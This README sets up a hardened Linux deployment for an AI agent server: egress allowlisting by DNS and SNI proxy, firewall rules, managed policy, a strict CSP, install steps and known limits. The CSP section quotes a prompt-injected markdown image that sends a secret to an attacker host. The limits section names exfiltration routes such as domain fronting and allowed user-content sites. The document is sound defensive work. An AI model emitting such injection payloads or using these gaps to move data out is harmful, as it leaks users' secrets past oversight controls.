# Hardened Linux deployment

A headless Up.computer server on Ubuntu 24.04, reachable only over Tailscale, where the agent's user can reach only an allowlist of domains. The files here were copied from a live box.

## Layers

- **Unprivileged `upc` user.** The server and every agent run as `upc`: no sudo, not in the `docker` group.
- **Read-only code.** The app lives in `/opt/upcomputer` and node in `/opt/node`, both owned by root. The unit adds `ProtectSystem=strict`, `NoNewPrivileges` and a private `/tmp`; only `/home/upc` and `/tmp` are writable.
- **DNS allowlist.** `dnsmasq` listens on `127.0.0.2`. nftables sends `upc`'s port 53 traffic (UDP and TCP) there, and it answers only the domains in `allowlist.txt` (and their subdomains).
- **SNI proxy.** nftables redirects all TCP 443 from `upc` to nginx (`ssl_preread`) on `127.0.0.1:8443`. nginx forwards a connection only when its SNI matches an allowlisted domain, and resolves that name itself. Any other SNI goes to a closed port.
- **Firewall.** For `upc`, nftables accepts only the SNI proxy, the DNS resolver and loopback. Everything else is rejected, and logged with the prefix `upc-egress-drop`. Loopback ports of local admin services (9, 22, 631, 4369, 8090, 8911, 47984-48010) are dropped.
- **Managed policy.** `policy/policy.json` turns off telemetry, Connect, webhook tasks, browser cookie import and updates, and allows only the `codex` driver. `policy/settings.json` turns off provider update checks and automatic git fetch.
- **Strict browser CSP.** The unit sets `T3CODE_WEB_STRICT_CSP=true`, so every HTML response of the web app carries a Content-Security-Policy that limits images, media, fonts and connections to the server's own origin (plus local `data:` and `blob:`). The host firewall cannot see what the user's browser loads; without the CSP, a prompt-injected `![](https://attacker/?q=secret)` in the chat would be fetched by the browser. Consequences: link favicons fall back to a generic icon, remote images in chat do not render, and the browser cannot reach other servers (for example a second environment or the theme marketplace) from this origin. Per-route CSPs on downloads and agent HTML are unchanged.

## Install (Ubuntu 24.04, as root)

Build the server first (`vp run --filter t3 build` in a checkout) and have it at `/opt/upcomputer`, with node at `/opt/node`, both owned by root.

```sh
apt install -y dnsmasq nginx-core libnginx-mod-stream
systemctl disable --now dnsmasq nginx

useradd --create-home --home-dir /home/upc --shell /bin/bash upc
install -d -o upc -g upc /home/upc/work /home/upc/.upcomputer/userdata

install -d /etc/upc-egress /etc/t3code
install -m 644 allowlist.txt /etc/upc-egress/allowlist.txt
install -m 755 upc-egress-apply /usr/local/sbin/upc-egress-apply
install -m 644 policy/policy.json /etc/t3code/policy.json
install -m 600 -o upc -g upc policy/settings.json /home/upc/.upcomputer/userdata/settings.json
install -m 644 systemd/*.service /etc/systemd/system/

touch /var/log/upc-dns.log /var/log/upc-sni.log
systemctl daemon-reload
systemctl enable --now upc-egress upc-dns upc-sni upcomputer

tailscale serve --bg --https=443 http://127.0.0.1:3773
tailscale set --operator=
```

Run these from `deploy/hardened-linux/`. Disabling the stock `dnsmasq` and `nginx` units keeps them off ports 53 and 80; the `upc-*` units run their own instances from `/etc/upc-egress`.

## Add a domain

```sh
echo example.com >> /etc/upc-egress/allowlist.txt
upc-egress-apply
systemctl restart upc-dns upc-sni
```

A domain also allows its subdomains.

## Logs

- `/var/log/upc-dns.log`: every DNS query from `upc`.
- `/var/log/upc-sni.log`: every TLS connection, with the SNI and the upstream it was sent to (`127.0.0.1:9` means refused).
- `/var/log/upc-sni-error.log`: nginx errors.
- Kernel log, prefix `upc-egress-drop`: packets nftables rejected (`journalctl -k | grep upc-egress-drop`).

## Known limits

- The filter reads the SNI only. Nothing inside TLS is inspected, so domain fronting is not caught.
- Any allowed domain that hosts user content (for example `github.com`) is a possible exfiltration path.
- Only TCP 443 is allowed out. Other protocols are rejected.
- The provider login token in `/home/upc/.codex` is readable by agents.
- The CSP covers the browser side of the app shell only. Content that agents write to disk and the server's own downloads are outside it.
